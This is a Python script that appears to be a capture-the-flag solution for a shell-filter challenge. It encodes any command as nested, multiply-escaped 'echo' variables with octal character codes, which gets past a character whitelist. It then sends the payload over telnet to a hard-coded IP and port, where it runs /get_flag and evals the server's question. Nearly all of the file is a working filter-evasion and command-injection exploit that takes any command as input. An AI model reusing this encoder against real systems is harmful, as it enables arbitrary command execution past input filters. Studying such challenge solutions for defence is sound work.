#!/usr/bin/env python3
import re
import sys
from typing import List
from telnetlib import Telnet
import subprocess

unsafe_chars = re.compile("[^a-zA-Z0-9,._+:@%/-]")
iterator = iter(range(2, 1000))

if len(sys.argv) != 1:
    cmd = sys.argv[1]
else:
    pycmd = """from subprocess import Popen, PIPE
test = Popen(["/get_flag"], stdin=PIPE, stdout=PIPE, bufsize=1, universal_newlines=True)
print(test.stdout.readline())
q = test.stdout.readline()
print("Question:", q)
a = eval(q)
print(a)
test.stdin.write(str(a)+"\\n")
print(test.stdout.readline())
print(test.poll())
print(test.communicate("fun"))
print("Python end")
"""
    cmd = "/usr/bin/python3 -c '{}';".format(pycmd.replace("\n", ";"))

print(cmd)


def next_free_echocount():
    return iterator.__next__()


def escape_by(s, level):
    if not level:
        return s
    for i in range(level):
        s = re.escape(s)
    return s


levels = {}
bases = {}


def level(var, set=None):
    if set:
        levels[var] = set
    else:
        try:
            return levels[var]
        except:
            return 0


l = level


def base(var, set=None):
    if set:
        bases[var] = set
    else:
        try:
            return bases[var]
        except Exception as ex:
            print("No base for {}".format(var))
            return ""


b = base

i = next_free_echocount()
equals = "$" + "echo" * i
l(equals, 0)
b(equals, ["echo" * i + r"=\=;"])

LEVELS = 4


def c(definition: List[str] = None, level=0):
    i = next_free_echocount()
    ret = "$" + "echo" * i
    l(ret, level)
    if definition:
        b(ret, ["echo" * i, equals] + definition)
    return ret


# eight = c([escape_by("$$", 2)], 2)

# l(eight, 1)

smcln = c([escape_by(r"\;;", 1)], 1)
bopen = c([escape_by(r"\(", 2), smcln], 2)
bclose = c([escape_by(r"\)", 2), smcln], 2)
plus = c([escape_by(r"\+", 2), smcln], 2)
single_quote = c([escape_by(r"\'", 2), smcln], 2)

# print(escape_by(b(single_quote), 3))
# echoechoechoechoechoechoecho\\\$echoecho\\\\\\\'\\\$echoechoecho
# four = f"echo echo $\'\\$(({eight}+{eight}+{eight}+{eight}+{eight}+{eight}+{eight}+{eight}))\'"
# l(four, 4)

zero = c([escape_by("$", 3), bopen, bopen, escape_by(r"\echo", 2), bclose, bclose, escape_by("\\", 2), smcln], 3)


def next_num():
    return c([escape_by("$", 3), bopen, bopen, plus, plus, escape_by(r"\echo", 2), bclose, bclose, escape_by("\\", 2),
              smcln], 3)


one = next_num()
two = next_num()
three = next_num()
four = next_num()
five = next_num()
six = next_num()
seven = next_num()
# seven could be single echo later...
# l(seven, 3)

# command = ["echo ", escape_by("$",3), bopen,bopen, eight, plus, eight, bclose,bclose]


nums = [zero, one, two, three, four, five, six, seven]


def get_char(character: str) -> List[str]:
    o = oct(ord(character))[2:]
    l = [escape_by('\\', 4)]
    l += [nums[int(x)] for x in o]
    return l


def escape_str(s: str) -> List[str]:
    l = [escape_by('$', 4), escape_by('\\', 3), single_quote]
    for ch in s:
        l += get_char(ch)
    l += [escape_by('\\', 3), single_quote]
    return l


# command = ["echo  echo ", escape_by('$', 4), escape_by('\\', 3), single_quote, escape_by('\\', 4), one, zero, one,
#           escape_by('\\', 3), single_quote]

command = ["echo echo "] + escape_str(cmd)

s = ""
curr_level = 0
for key, value in bases.items():
    if l(key) > curr_level:
        s += (l(key) - curr_level) * "echo "
        curr_level = l(key)
    s += "".join([escape_by(part, l(part)) for part in value]) + " "

s += "".join([escape_by(part, l(part)) for part in command]) + " "

print("\n\nEND -TEXT")
# a = subprocess.check_output(s + "|bash" * 4, shell=True, executable="/bin/bash")
# print(a)
try:
    pass
    # result = subprocess.check_output(s + "|bash" * 5, shell=True, executable="/bin/bash")
    # print(result)
except:
    pass
print("\n\n")

try:
    telnet = Telnet("35.246.181.187", 1337)
    print(telnet.read_until(b"thisfile')"))

    telnet.write(s.encode("utf-8"))
    telnet.write(b'\n')
    print(telnet.read_until(b'that?\n'))
    telnet.write(b'5\n')
    print(telnet.read_all().decode("utf-8"))
except Exception as ex:
    print(ex)

print(len(s))
f = open("ex.txt", 'w')
f.write(s)
f.close()
